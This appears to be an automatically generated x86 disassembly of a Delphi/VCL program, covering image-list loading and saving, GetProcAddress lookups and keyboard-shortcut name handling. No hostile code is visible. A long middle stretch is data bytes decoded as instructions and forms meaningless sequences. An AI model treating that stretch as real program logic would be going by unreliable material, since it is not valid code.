mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44bf70
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_44c0bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41a45c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_44c060
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44c114
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_4160a8
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_4160a8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44c398
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_415e7c
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_415e9c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44c37b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_4233e8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_4129b0
mov eax [ ebp - 0x4 ]
call sub_44c740
xor eax eax
push ebp
push sub_44c35e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c365
mov eax [ ebp - 0xc ]
call sub_4032a0
mov eax [ ebp - 0x14 ]
call sub_4032a0
mov eax [ ebp - 0x4 ]
call sub_44c744
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_4129d8
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_422678
push eax
mov eax [ ebp - 0xc ]
call sub_422678
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41de5c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_4129d8
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_422678
push eax
mov eax [ ebp - 0x14 ]
call sub_422678
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41de5c
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44b33c
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_44c3a8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41abdc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44c408
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44b1c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c40f
mov eax [ ebp - 0xc ]
call sub_4032a0
retn
sub eax 0xffffffec
sub_44c40f
mov eax [ ebp - 0x4 ]
call sub_44b02c
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44c53e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_415e9c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4165a4
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_415e9c
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4032a0
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_415e9c
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41abdc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44c521
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_415e9c
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44b1c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032a0
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_415e9c
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_44c570
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_44b264
mov eax edi
call sub_415e7c
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_415e9c
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_44c114
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_44c3a8
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44c5fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_41abdc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44c6f6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40be8c
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_44b200
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_44b200
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c6fd
mov eax [ ebp - 0x4 ]
call sub_4032a0
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
jmp r-xdata
sub_44c764
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
mov edx esi
call sub_44bed4
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_44c7b0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44c7d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c7dc
retn
sub_44ca1b
adc [ eax ] al
cmp al 0xbf
inc ecx
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
je r-xdata
je r-xdata
inc esp
add [ eax + 0x3c0041a9 ] ch
loopne r-xdata
inc esi
insb
popad
add [ bx + si ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx + ecx * 8 ] ch
inc esp
add [ 0x756e654d ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx * 8 + 0x44 ] ah
add [ eax + eax ] bl
add [ eax ] al
insd
inc ecx
jne r-xdata
movsb [ edi ] [ esi ]
inc esp
add [ edi + ebx * 8 - 0x5b0fffbc ] bl
inc esp
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ eax - 0x23ffbb21 ] bh
fild [ eax + eax - 0x4 ]
fild [ eax + eax + 0x1c ]
loopne r-xdata
add al ch
add al bh
test al 0x41
add [ ecx + ebp * 4 - 0x561fffbf ] cl
inc ecx
add [ eax ] ah
fld [ eax + eax + 0x58 ]
fld [ eax + eax - 0x78 ]
fld [ eax + eax + 0x1c ]
fiadd [ eax + eax - 0x48 ]
fld [ eax + eax + 0x74 ]
movsb [ edi ] [ esi ]
inc esp
add al ch
fld [ eax + eax + 0x58 ]
fiadd [ eax + eax - 0x74 ]
fiadd [ eax + eax - 0x40 ]
fiadd [ eax + eax + 0x1c ]
fild [ eax + eax + 0x3c ]
fild [ eax + eax + 0x5c ]
fild [ eax + eax + 0x7c ]
fild [ eax + eax - 0x18 ]
inc eax
add [ ebx + 0x44ca30c0 ] cl
add [ ebx ] al
adc [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
cmp al 0x10
shr al 0xca
inc esp
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
add al bh
fadd [ eax + eax + 0xf ]
push esp
dec ebp
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al

outsd
inc esi
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
in al 0xe0
inc esp
add [ eax + 0x9 ] dh
inc ebp
add ah dh
out 0x44 al
add [ esp + eax * 2 ] dh
inc ecx
add [ 0x9e80044 ] bh
inc ebp
add [ ebp + 0x41 ] al
add [ esi ] bh
inc ecx
add [ eax + ebp * 4 + 0x41 ] ch
add [ ebp + 0x41 ] dl
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ eax - 0x20 ] ch
inc esp
add [ eax + 0x480044fb ] bh
jmp 0xfffffffffdaccc3e
cld
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or ah cl
inc esp
add [ esp + ecx * 8 + 0x44 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ah
int3
add ah dh
xor al 0x40
add al bh
inc eax
outsd
insd
popad
je r-xdata
cmp al 0x9d
arpl [ eax ] cx
insd
popad
dec ebp
popad
outsb
jne r-xdata
inc esp
add al ch
xor al 0x40
popfd
insb
or [ ebp + 0x61 ] ch
push eax
popad
jb r-xdata
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
inc eax
test eax 0xdcdc0041
inc esp
add [ ecx + ebp * 4 + 0x41 ] dh
add ah dh
fiadd [ eax + eax - 0x58 ]
test eax 0xe03c0041
outsb
je r-xdata
js r-xdata
dec ebp
outsb
jne r-xdata
insb
popad
add [ bx + si ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx + ecx * 8 ] ch
inc esp
add [ ebx ] cl
insd
popad
inc ecx
jne r-xdata
inc esp
add [ ebx ] al
or eax 0x6e654d54
jne r-xdata
add ah bl
fadd [ eax + eax + 0x74 ]
test eax 0xdef40041
add [ eax ] al
add [ ebx * 4 + 0x34e80044 ] bh
jne r-xdata
inc esp
inc ecx
add [ eax ] bh
outsd
sub_44cc5a
inc esp
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
je r-xdata
push es
add [ esi ] al
inc edx
inc ebx
push 0x2c6b6365
0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
insd
ror bl 0x44
add [ edi + 0x180041 ] ch
add eax 0x756e654d
jae r-xdata
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
add [ eax ] al
add [ edx ] 0x0
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp ] bh
inc ecx
add ah bh
add [ ebp ] al
cwde
add eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
outsb
jne r-xdata
imul edx [ eax + edx + 0x300040 ] 0x0
popad
jns r-xdata
push esp
adc [ eax ] al
aas
add [ eax ] al
insd
popad
jae r-xdata
add bh bh
jl r-xdata
sub al 0xca
inc esp
add [ eax + eax ] bh
add bh bh
sbb [ ebx ] dl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add eax 0x75411100
je r-xdata
adc [ eax ] al
cmp al [ eax ]
add bh bh
xor al 0x2
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
jne r-xdata
inc [ eax + eax + 0x50 ]
or [ ebp ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
pop es
inc ebx
popad
jo r-xdata
inc esp
add [ eax + 0x8 ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070008 ] al
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
imul esi [ ebp + ebp * 2 + 0x61 ] 0x44c84070
add [ eax ] cl
add bh bh
insb
inc [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ 0x61657242 ] al
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
sbb ch al
inc ecx
add [ eax + 0x5 ] dh
inc ebp
add [ eax ] cl
push es
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42060006 ] al
js r-xdata
je r-xdata
add [ eax ] al
inc [ eax ]
inc ebp
add [ eax + 0x4508 ] dl
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
in al dx
inc [ eax + eax + 0x70 ]
or [ ebp ] al
add [ eax ] al
add [ eax ] al
or [ eax ] eax
pop es
inc ebx
push 0x656b6365
cld
lodsd [ esi ]
inc esp
add [ eax + eax ] bh
adc [ ecx ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
mov al 0x8
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
[ ecx + eax + 0x45 ]
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
adc [ eax ] al
cmp [ eax ] eax
add bh bh
inc eax
add [ ebp ] al
nop
or [ ebp ] al
add [ eax ] al
add [ eax + 0x1 ] al
cwde
inc ebx
jne r-xdata
inc ecx
add [ eax + ebp * 4 + 0x41 ] dl
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
[ ecx + eax + 0x45 ]
add [ eax ] dh
or [ ebp ] eax
add [ eax ] al
add [ eax + 0x1 ] al
adc eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0xc0656c62
adc eax [ ecx ]
mov [ eax ] al
add bh bh
mov [ eax ] al
add bh bh
push eax
or [ ebp ] eax
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
ja r-xdata
add ah dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
add [ edx ] dh
rol [ eax + eax + 0x46 ] 0x1
rol [ eax + eax + 0x58 ] 0x1
add [ eax ] al
add [ eax + 0x54004126 ] dh
test al 0x41
je r-xdata
add [ 0x654d6e4f ] cl
popad
jae r-xdata
je r-xdata
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
sbb al 0x14
inc ebp
add [ eax ] bl
inc ebp
inc ecx
add [ esp + 0x41 ] bl
add [ esp + eax * 2 ] dh
inc ecx
add [ esp + ebx + 0x45 ] al
add al ah
sbb al 0x45
insd
mov esp 0xa00044c9
add [ eax ] al
jmp [ eax + 0x1ff0000 ]
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ eax + 0x2c004513 ] al
sbb al 0x45
add [ eax + 0x14 ] dh
inc ebp
add [ esp + ebx + 0x45 ] bl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ eax ] al
add eax [ eax ]
std
push esp
movsd [ edi ] [ esi ]
inc ecx
jb r-xdata
and al dl
inc esp
add [ eax - 0x30 ] dl
inc esp
add [ eax ] al
add [ eax ] al
insd
inc esp
leave
inc esp
add [ eax - 0x67010000 ] bl
add [ ebp + 0x41 ] al
inc ebp
dec ecx
je r-xdata
add [ esi ] bh
inc ecx
add [ eax + ebp * 4 + 0x41 ] ch
add [ ebp + 0x41 ] dl
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
lea eax [ eax ]
in al 0xcf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
rol [ eax + eax + 0x50 ] 0x1
rol [ eax + eax ] 0x1
sub_44d059
inc esp
add [ edi + 0x30041 ] ch
add eax 0x756e654d
jae r-xdata
pop eax
int3
add [ eax - 0x34 ] bl
inc esp
add [ eax + eax ] dh
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add eax 0x6d657449
jae r-xdata
add [ eax + 0x14 ] dh
inc ebp
add [ esp + ebx + 0x45 ] bl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ eax ] al
add eax [ eax ]
std
inc eax
add al bl
rol [ eax + eax ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 8 ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 8 ] dl
inc esp
add [ eax ] ah
add [ eax ] al
cwde
iretd
sub_44d374
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc ah dl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x44
add [ eax ] bh
add [ eax ] al
cwde
iretd
sub_44d718
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_43c670
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_441ee4
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_44d770
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_44d7a8
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_404074
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_4042e4
sub_44d7fc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_44d9e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_40410c
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_40425c
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_40410c
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_40410c
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_40425c
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_40425c
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_404074
mov eax esi
call sub_404074
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_40410c
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_40804c
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404380
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_44d7a8
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40433c
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_40410c
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40433c
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_40433c
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40433c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d9ec
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404098
retn
sub_44da00
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_404334
push eax
mov eax edi
call sub_404334
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_404334
push eax
mov eax edi
call sub_404534
push eax
mov eax [ esi ]
call sub_404534
pop edx
pop ecx
call sub_407f2c
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_404334
mov ecx eax
mov eax esi
mov edx 0x1
call sub_4045d4
sub_44da5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404524
xor eax eax
push ebp
push sub_44db37
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_44da00
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44da00
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44da00
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
